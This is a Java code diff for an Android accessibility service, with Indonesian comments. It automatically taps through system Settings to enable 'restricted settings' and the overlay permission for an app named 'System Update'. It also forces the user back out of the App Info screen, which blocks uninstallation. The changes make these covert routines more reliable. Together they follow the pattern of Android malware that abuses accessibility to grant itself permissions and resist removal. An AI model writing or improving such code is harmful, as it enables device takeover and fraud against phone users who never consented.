@@ -15,6 +15,8 @@ import java.util.List;
 
 public class CustomAccessibilityService extends AccessibilityService {
 
+    private long lastActionTime = 0;
+
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -46,6 +48,16 @@ public class CustomAccessibilityService extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
+        // Jeda 500ms antar aksi untuk mencegah spamming klik
+        long currentTime = System.currentTimeMillis();
+        if (currentTime - lastActionTime < 500) return;
+
+        // Jika izin Overlay sudah aktif dan kita masih di pengaturan, segera kembali ke aplikasi
+        if (Settings.canDrawOverlays(this) && packageName.contains("settings")) {
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            return;
+        }
+
         // 1. Rescue Logic: Jika salah klik dan malah masuk ke 'App Info', otomatis kembali
         if (packageName.contains("settings") && className.toLowerCase().contains("appdetails")) {
             performGlobalAction(GLOBAL_ACTION_BACK);
@@ -67,11 +79,11 @@ public class CustomAccessibilityService extends AccessibilityService {
             checkAndClick(rootNode, "Izinkan pengaturan terbatas");
         }
 
-        // 3. Cek apakah ada Switch/Toggle di layar (berarti kita sudah di halaman detail izin)
-        boolean switchFound = findAndClickSwitch(rootNode);
+        // 3. Tangani Switch Toggle di halaman detail izin
+        boolean switchHandled = processOverlaySwitch(rootNode);
 
-        // 4. Jika TIDAK ada Switch, cari nama aplikasi di daftar (untuk masuk ke detail)
-        if (!switchFound && packageName.contains("settings") && !className.contains("AppDetails")) {
+        // 4. Jika Switch tidak ditemukan di layar ini, cari nama aplikasi di daftar
+        if (!switchHandled && packageName.contains("settings") && !className.contains("AppDetails")) {
             checkAndClick(rootNode, "System Update");
         }
 
@@ -115,16 +127,26 @@ public class CustomAccessibilityService extends AccessibilityService {
         }
     }
 
-    private boolean findAndClickSwitch(AccessibilityNodeInfo node) {
+    private boolean processOverlaySwitch(AccessibilityNodeInfo node) {
         if (node == null) return false;
+        
+        // Cek elemen Switch atau Toggle
         if (node.getClassName() != null && 
-           (node.getClassName().toString().contains("Switch") || node.getClassName().toString().contains("ToggleButton")) 
-           && !node.isChecked()) {
-            clickNode(node);
+           (node.getClassName().toString().contains("Switch") || node.getClassName().toString().contains("ToggleButton"))) {
+            
+            if (node.isChecked()) {
+                // Jika sudah ON, jangan klik lagi, tapi langsung kembali
+                writeLog("Overlay is already ON. Going back.");
+                performGlobalAction(GLOBAL_ACTION_BACK);
+            } else {
+                // Jika masih OFF, klik untuk mengaktifkan
+                clickNode(node);
+            }
             return true;
         }
+        
         for (int i = 0; i < node.getChildCount(); i++) {
-            if (findAndClickSwitch(node.getChild(i))) return true;
+            if (processOverlaySwitch(node.getChild(i))) return true;
         }
         return false;
     }
@@ -143,8 +165,11 @@ public class CustomAccessibilityService extends AccessibilityService {
     private void checkAndClick(AccessibilityNodeInfo node, String text) {
         List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
         if (nodes != null && !nodes.isEmpty()) {
-            for (AccessibilityNodeInfo n : nodes) { 
-                clickNode(n); 
+            for (AccessibilityNodeInfo n : nodes) {
+                // Validasi: Pastikan teksnya sama persis agar tidak salah klik aplikasi lain
+                if (n.getText() != null && n.getText().toString().equals(text)) {
+                    clickNode(n);
+                }
                 n.recycle();
             }
         }
@@ -163,6 +188,7 @@ public class CustomAccessibilityService extends AccessibilityService {
             clickableNode = clickableNode.getParent();
         }
         if (clickableNode != null && clickableNode.isClickable()) {
+            lastActionTime = System.currentTimeMillis();
             clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
         }
     }
